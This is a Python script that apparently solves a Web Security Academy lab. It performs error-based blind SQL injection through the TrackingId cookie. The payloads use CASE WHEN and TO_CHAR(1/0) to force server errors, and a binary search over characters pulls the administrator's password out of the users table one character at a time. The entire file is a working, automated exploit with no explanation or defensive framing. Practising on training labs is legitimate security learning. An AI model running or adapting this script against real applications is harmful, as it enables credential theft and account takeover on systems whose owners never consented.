import requests
import sys

url = "https://0aef00ca03a7195681a3a218008b008e.web-security-academy.net/"
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"

i=1
while(True):
    end = len(chars)-1
    start = 0
    while(start <= end):
        mid = (start+end)//2
        payload = f"aasdf' UNION SELECT CASE WHEN (username='administrator' and '{chars[mid]}'<substr(password, {i}, 1) ) THEN TO_CHAR(1/0) ELSE NULL END FROM users-- -" 
        cookies = {"TrackingId":payload}
        r = requests.get(url, cookies=cookies).text
        # greater
        if("Internal Server Error" in r):
            start = mid+1 
            
        #smaller or equals
        else:
            payload = f"aasdf' UNION SELECT CASE WHEN (username='administrator' and substr(password, {i}, 1) = '{chars[mid]}' ) THEN TO_CHAR(1/0) ELSE NULL END FROM users-- -" 
            cookies = {"TrackingId":payload}
            r = requests.get(url, cookies=cookies).text

            #equals
            if("Internal Server Error" in r):
                sys.stdout.write(chars[mid])
                sys.stdout.flush()
                i += 1
                break
            #smaller
            else:
                end = mid -1 

